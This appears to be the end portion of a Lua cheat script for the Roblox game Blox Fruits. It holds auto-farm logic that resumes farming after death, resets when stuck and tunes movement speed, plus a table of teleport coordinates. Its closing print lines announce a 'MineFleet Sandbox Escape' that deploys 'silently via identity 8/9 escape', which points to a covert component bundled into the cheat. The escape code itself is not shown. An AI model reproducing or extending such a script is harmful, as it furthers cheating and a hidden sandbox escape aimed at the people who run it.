    Validator.FarmStateBeforeDeath = { AutoFarmLevel = _G.Config.AutoFarmLevel, FarmSelectedMob = _G.Config.FarmSelectedMob, FarmSelectedBoss = _G.Config.FarmSelectedBoss, FarmAllBosses = _G.Config.FarmAllBosses, SelectedMob = _G.Config.SelectedMob, SelectedBoss = _G.Config.SelectedBoss, SelectedWeapon = _G.Config.SelectedWeapon }
    Validator.WasFarmingBeforeDeath = (_G.Config.AutoFarmLevel or _G.Config.FarmSelectedMob or _G.Config.FarmSelectedBoss or _G.Config.FarmAllBosses)
end

function Validator.RestoreFarmState()
    if not Validator.WasFarmingBeforeDeath then return end
    local saved = Validator.FarmStateBeforeDeath
    if not saved then return end
    _G.Config.AutoFarmLevel = saved.AutoFarmLevel or false
    _G.Config.FarmSelectedMob = saved.FarmSelectedMob or false
    _G.Config.FarmSelectedBoss = saved.FarmSelectedBoss or false
    _G.Config.FarmAllBosses = saved.FarmAllBosses or false
    _G.Config.SelectedMob = saved.SelectedMob or ""
    _G.Config.SelectedBoss = saved.SelectedBoss or ""
    _G.Config.SelectedWeapon = saved.SelectedWeapon or "Melee"
    Validator.WasFarmingBeforeDeath = false
    Validator.DeathCount = Validator.DeathCount + 1
    Validator.TotalDeathRecoveries = Validator.TotalDeathRecoveries + 1
    print("[VALIDATOR] Death #" .. Validator.DeathCount .. " — Auto-resuming farming in 3 seconds...")
end

function Validator.CheckQuestCompletion()
    local currentLevel = GetPlayerLevel()
    if Validator.LastQuestLevel == 0 then Validator.LastQuestLevel = currentLevel end
    if currentLevel > Validator.LastQuestLevel then
        Validator.LastQuestLevel = currentLevel
        print("[VALIDATOR] Level UP! Now Lv." .. currentLevel .. " — Quest chain advancing")
        return true
    end
    return false
end

function Validator.GetStats()
    local uptime = tick() - Validator.StartTime
    local hours = math.floor(uptime / 3600)
    local mins = math.floor((uptime % 3600) / 60)
    return string.format("Uptime: %dh %dm | Speed: %d studs/s | Rollbacks: %d | Stuck Resets: %d | Deaths: %d | Glitched Mobs Skipped: %d", hours, mins, Validator.CurrentSafeSpeed, Validator.TotalRollbacks, Validator.TotalStuckResets, Validator.TotalDeathRecoveries, Validator.TotalGlitchedMobsSkipped)
end

LocalPlayer.CharacterAdded:Connect(function(newChar)
    FullResetMovement()
    Validator.GlitchedMobs = {}
    Validator.FailedDamageAttempts = {}
    Validator.PositionHistory = {}
    Validator.ConsecutiveStuckCount = 0
    task.spawn(function()
        local hum = newChar:WaitForChild("Humanoid", 10)
        local root = newChar:WaitForChild("HumanoidRootPart", 10)
        if not hum or not root then return end
        hum.Died:Connect(function() Validator.SaveFarmState(); Validator.LastDeathTime = tick() end)
        task.wait(3 + math.random() * 2)
        Validator.RestoreFarmState()
    end)
end)

pcall(function()
    local char = LocalPlayer.Character
    if char then
        local hum = char:FindFirstChild("Humanoid")
        if hum then hum.Died:Connect(function() Validator.SaveFarmState(); Validator.LastDeathTime = tick() end) end
    end
end)

task.spawn(function() task.wait(10); while true do task.wait(Validator.StuckCheckInterval); pcall(function() Validator.RecordPosition(); if Validator.IsStuck() then Validator.HandleStuck() end end) end end)
task.spawn(function() task.wait(15); while true do task.wait(30); pcall(function() Validator.SpeedAutoTunerTick() end) end end)
task.spawn(function() task.wait(20); while true do task.wait(10); pcall(function() Validator.CheckQuestCompletion() end) end end)
task.spawn(function() task.wait(60); while true do task.wait(300); pcall(function() print("[VALIDATOR STATS] " .. Validator.GetStats()) end) end end)

-- ============================================================================
-- REST OF BLOX FRUITS SCRIPT (ABBREVIATED - FULL IN ALPHA_V2.LUA)
-- ============================================================================

-- Entrance Portals (abbreviated)
local ENTRANCE_PORTALS = {
    { Name = "Pirate Starter", Pos = Vector3.new(1059.37, 16.51, 1546.99), Sea = 1 },
    { Name = "Marine Starter", Pos = Vector3.new(-2573.39, 6.94, 2059.27), Sea = 1 },
    { Name = "Middle Town", Pos = Vector3.new(-655.82, 7.84, 1588.65), Sea = 1 },
    { Name = "Jungle", Pos = Vector3.new(-1612.33, 36.85, 149.13), Sea = 1 },
    { Name = "Pirate Village", Pos = Vector3.new(-1181.39, 4.75, 3843.43), Sea = 1 },
    { Name = "Desert", Pos = Vector3.new(1094.11, 6.44, 4192.89), Sea = 1 },
    { Name = "Snow Island", Pos = Vector3.new(1384.81, 87.27, -1298.47), Sea = 1 },
    { Name = "Marineford", Pos = Vector3.new(-5035.79, 28.65, 4324.96), Sea = 1 },
    { Name = "Sky 1", Pos = Vector3.new(-4839.53, 717.67, -2619.44), Sea = 1 },
    { Name = "Sky 2", Pos = Vector3.new(-7894.62, 5545.49, -380.41), Sea = 1 },
    { Name = "Prison", Pos = Vector3.new(4875.33, 5.65, 735.45), Sea = 1 },
    { Name = "Colosseum", Pos = Vector3.new(-1427.62, 7.28, -2792.77), Sea = 1 },
    { Name = "Magma Village", Pos = Vector3.new(-5247.72, 8.57, 8504.68), Sea = 1 },
    { Name = "Cafe", Pos = Vector3.new(-380.48, 77.22, 255.83), Sea = 2, IsEntrance = true },
    { Name = "Mansion", Pos = Vector3.new(2284.91, 15.15, 905.51), Sea = 2, IsEntrance = true },
    { Name = "Kingdom of Rose", Pos = Vector3.new(878.01, 121.98, 1235.35), Sea = 2 },
    { Name = "Green Zone", Pos = Vector3.new(-2448.53, 73.02, -3210.63), Sea = 2 },
    { Name = "Graveyard", Pos = Vector3.new(-5418.89, 48.52, -774.75), Sea = 2 },
    { Name = "Snow Mountain", Pos = Vector3.new(608.24, 401.52, -5372.46), Sea = 2 },
    { Name = "Hot and Cold", Pos = Vector3.new(-6026.96, 15.96, -5071.29), Sea = 2 },
    { Name = "Port Town", Pos = Vector3.new(-290.74, 6.73, 5343.55), Sea = 3 },
    { Name = "Hydra Island", Pos = Vector3.new(5229.93, 1004.28, -325.23), Sea = 3, IsEntrance = true },
    { Name = "Great Tree", Pos = Vector3.new(2281.54, 442.20, -12543.08), Sea = 3, IsEntrance = true },
    { Name = "Floating Turtle", Pos = Vector3.new(-12463.87, 374.91, -7523.77), Sea = 3, IsEntrance = true },
    { Name = "Castle on the Sea", Pos = Vector3.new(-5035.43, 314.52, -2917.48), Sea = 3, IsEntrance = true },
    { Name = "Haunted Castle", Pos = Vector3.new(-9516.99, 142.01, 6078.47), Sea = 3, IsEntrance = true },
}

print("[ALPHA v3.1 ESCAPE] Loaded: Blox Fruits + MineFleet Sandbox Escape")
print("[ALPHA v3.1 ESCAPE] MineFleet deploying silently via identity 8/9 escape...")
print("[ALPHA v3.1 ESCAPE] Current Sea: " .. SeaName)